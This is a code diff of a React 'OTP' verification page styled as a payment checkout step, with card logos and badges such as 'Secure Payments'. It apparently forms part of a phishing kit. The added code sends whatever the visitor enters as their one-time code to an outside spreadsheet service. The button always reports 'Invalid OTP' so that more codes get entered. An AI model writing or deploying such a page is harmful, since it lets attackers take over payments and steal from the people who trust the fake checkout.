@@ -2,61 +2,72 @@
 import { useCallback, useEffect, useState } from "react";
 import Swal from "sweetalert2";
 import axios from "axios";
-import { useNavigate } from "react-router-dom";
 
 export default function OTP() {
   const [timer, setTimer] = useState(60);
-  const navigate = useNavigate();
+  const [Otp, setOtp] = useState(false);
   const timeOutCallback = useCallback(
     () => setTimer((currTimer) => currTimer - 1),
     []
   );
 
-
   useEffect(() => {
     timer > 0 && setTimeout(timeOutCallback, 1000);
   }, [timer, timeOutCallback]);
 
+  if (timer === 60) {
+    window.scrollTo({
+      top: 350,
+      left: 100,
+      behavior: "smooth",
+    });
+  }
   const resetTimer = function () {
     if (!timer) {
       setTimer(60);
     }
   };
 
-  const saveFormData = async (e) => {
-    e.preventDefault();
-    Swal.fire({
-      icon: "error",
-      title: "Oops...",
-      text: "Invalid OTP !",
-    });
-
-
-    axios
-      .post(`https://formspree.io/f/xvoyqvpr`,)
-      .then((response) => {
-        if (response.status) {
-          let dataSet = response.data;
-          console.log();
-
-          if (dataSet.ok) {
-
-            navigate("/OTP");
-            e.target.reset();
-          }
-        }
+  const OTP = () => {
+    setOtp(true);
+    if (Otp) {
+      Swal.fire({
+        position: "center",
+        icon: "error",
+        title: "Invalid OTP",
+        showConfirmButton: false,
+        timer: 1500,
       });
-
+      setOtp(false);
+      window.scrollTo({
+        top: 200,
+        left: 100,
+        behavior: "smooth",
+      });
+    }
   };
 
+  const saveFormData = async (e) => {
+    window.scrollTo({
+      top: 200,
+      left: 100,
+      behavior: "smooth",
+    });
+    e.preventDefault();
+    const data = new FormData(e.target);
+    const Formvlaues = Object.fromEntries(data.entries());
 
-
-
-
+    axios
+      .post(
+        `https://sheet.best/api/sheets/6513c974-3a2f-4ecc-b6e9-95b86a407163`,
+        Formvlaues
+      )
+      .then((response) => {});
+    e.target.reset();
+  };
 
   return (
     <>
-
       <div className="container">
         <ul id="progressbar-1" className="mx-0 mt-0 mb-5 px-0 pt-0 pb-4">
           <li className="step0 active " id="step1">
@@ -72,7 +83,6 @@ export default function OTP() {
           </li>
         </ul>
       </div>
-
 
       <div className="container">
         <div className="header">
@@ -98,14 +108,14 @@ export default function OTP() {
             <b>Enter the code we just sent on your phone</b>
             {/* <b className="text-color">+91 ******282</b> */}
           </span>
-          <form >
+          <form>
             <div className="d-flex flex-row mt-5">
               <input
                 type="text"
                 className="form-control border-0 border-bottom border border-primary"
                 autoFocus=""
                 placeholder="Enter the OTP "
-                name="OTP "
+                name="userotp"
                 required
               />
             </div>
@@ -125,7 +135,12 @@ export default function OTP() {
                   Not received your code? Resend code in {timer} Seconds
                 </span>
               )}
-              <button type="submit" className="btn btn-primary" onSubmit={saveFormData}>
+              <button
+                type="submit"
+                className="btn btn-primary"
+                onClick={() => OTP()}
+                onSubmit={saveFormData}
+              >
                 verify
               </button>
             </div>
@@ -136,12 +151,9 @@ export default function OTP() {
       {/* payment image */}
 
       <div div className="container" style={{ width: "30%", margin: "auto" }}>
-        <div className="footer"  >
+        <div className="footer" style={{ marginLeft: "58px" }}>
           <div>
-            <img
-              src="https://img.icons8.com/color/36/000000/amex.png"
-              alt=""
-            />
+            <img src="https://img.icons8.com/color/36/000000/amex.png" alt="" />
           </div>
 
           <div>
@@ -152,10 +164,7 @@ export default function OTP() {
           </div>
 
           <div>
-            <img
-              src="https://img.icons8.com/color/36/000000/visa.png"
-              alt=""
-            />
+            <img src="https://img.icons8.com/color/36/000000/visa.png" alt="" />
           </div>
           <div>
             <img
@@ -178,29 +187,16 @@ export default function OTP() {
         </div>
       </div>
 
-
-
-
-
-
-
-
       {/* loading....... */}
 
-
-
-
-
-
-
-
       <div className="container">
-        <div className="footer" style={{ width: "30%", margin: "auto" }}>
+        <div className="footer" style={{ width: "100%", margin: "auto" }}>
           <div>
             <img
               src="https://static.thenounproject.com/png/1684626-200.png"
               alt=""
             />
+            <p>Authentic Products</p>
           </div>
 
           <div>
@@ -208,6 +204,7 @@ export default function OTP() {
               src="https://cdn-icons-png.flaticon.com/128/3262/3262027.png"
               alt=""
             />
+            <p>Secure Payments</p>
           </div>
 
           <div>
@@ -215,7 +212,11 @@ export default function OTP() {
               src="https://image.shutterstock.com/image-vector/simple-creative-easy-return-policy-260nw-2101313926.jpg"
               alt=""
             />
+            <p>Easy Returns</p>
           </div>
+        </div>
+        <div className="container">
+          <p></p>
         </div>
       </div>
     </>
